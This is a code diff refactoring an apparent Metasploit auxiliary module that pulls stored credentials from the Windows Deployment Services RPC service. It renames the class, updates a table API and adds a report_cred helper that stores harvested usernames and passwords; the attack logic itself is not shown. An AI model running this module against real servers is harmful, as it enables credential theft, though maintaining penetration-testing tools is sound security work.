@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -8,7 +8,7 @@ require 'rex/proto/dcerpc'
 require 'rex/proto/dcerpc/wdscp'
 require 'rex/parser/unattend'
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::DCERPC
   include Msf::Auxiliary::Report
@@ -28,7 +28,7 @@ class Metasploit3 < Msf::Auxiliary
         Deployment Services RPC service and parses out the stored credentials.
         Tested against Windows 2008 R2 x64 and Windows 2003 x86.
       },
-      'Author'         => [ 'Ben Campbell <eat_meatballs[at]hotmail.co.uk>' ],
+      'Author'         => [ 'Ben Campbell' ],
       'License'        => MSF_LICENSE,
       'References'     =>
         [
@@ -91,7 +91,7 @@ class Metasploit3 < Msf::Auxiliary
       :info => "#{WDS_CONST::WDSCP_RPC_UUID} v1.0 Windows Deployment Services"
     )
 
-    table = Rex::Ui::Text::Table.new({
+    table = Rex::Text::Table.new({
       'Header' => 'Windows Deployment Services',
       'Indent' => 1,
       'Columns' => ['Architecture', 'Type', 'Domain', 'Username', 'Password']
@@ -216,15 +216,40 @@ class Metasploit3 < Msf::Auxiliary
     print_status("Raw version of #{archi} saved as: #{p}")
   end
 
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :password
+    }.merge(service_data)
+
+    login_data = {
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED,
+      proof: opts[:proof]
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
+
   def report_creds(domain, user, pass)
-    report_auth_info(
-      :host  => rhost,
-      :port => 4050,
-      :sname => 'dcerpc',
-      :proto => 'tcp',
-      :source_id => nil,
-      :source_type => "aux",
-      :user => "#{domain}\\#{user}",
-      :pass => pass)
+    report_cred(
+      ip: rhost,
+      port: 4050,
+      service_name: 'dcerpc',
+      user: "#{domain}\\#{user}",
+      password: pass,
+      proof: domain
+    )
   end
 end
